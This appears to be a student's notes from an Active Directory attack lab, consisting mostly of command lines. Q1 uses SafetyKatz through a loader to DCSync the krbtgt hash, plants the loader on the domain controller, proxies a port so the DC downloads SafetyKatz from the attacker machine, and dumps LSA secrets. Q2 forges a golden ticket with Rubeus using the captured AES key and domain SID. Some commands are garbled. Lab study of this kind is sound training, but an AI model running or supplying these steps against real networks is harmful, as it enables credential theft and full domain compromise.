
![[../../../attchments/Pasted image 20250617143706.png]]

# Q1

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt"
exit
```

![[../../../attchments/Pasted image 20250617144254.png]]

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\c$\Users\Public\Loader.exe


winrs -r:dcorp-dc cmd

```


```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1
```


```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump:: evasive-lsa /patch"
"exit"
```


# Q2


creating the golden tiicket

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:<key> /sid:<SID> /ldap /user:Administrator /printcmd

```

the /aes key is the one we captured in Q1

the sid is of our curret domain

![[../../../attchments/Pasted image 20250617145855.png]]

```
C:\AD\Tools\Loader.exe path C:\AD\Tools\Rubeus.exe args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5ABC3CDA848
user:Administrator/id:500/pgid:513/domain:dollarcorp.moneycorp.local/sid:S-1-5-21-719815819-3726368948-3917688648/pwdlastset:"11/11/2022 6:34:22 AM" /minpassage
1/logoncount: 153/netbios:dcorp/groups: 544,512,520,513/dc:DCORP-DC.dollarcorp.moneycorp.local/uac: NORMAL ACCOUNT, DONT_EXPIRE PASSWORD /ptt :
```

